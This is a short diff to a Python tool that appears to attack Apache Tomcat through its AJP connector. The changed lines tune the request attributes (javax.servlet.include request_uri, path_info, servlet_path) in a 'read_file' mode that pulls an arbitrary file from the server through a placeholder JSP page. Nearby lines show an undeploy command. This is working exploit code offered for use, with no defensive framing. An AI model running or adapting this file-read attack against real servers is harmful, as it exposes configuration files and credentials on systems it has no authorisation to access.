@@ -370,9 +370,9 @@ if __name__ == "__main__":
 		bf.undeploy(args.path, args.user, args.password, args.old_version, args.headers)
 	elif args.which == 'read_file':
 		attributes = [
-			{"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "1",)},
+			{"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "/",)},
 			{"name": "req_attribute", "value": ("javax.servlet.include.path_info", args.file_path,)},
-			{"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "",)},
+			{"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/",)},
 		]
 		hdrs, data = bf.perform_request("/" + args.webapp + "/xxxxx.jsp", attributes=attributes)
 		output = sys.stdout
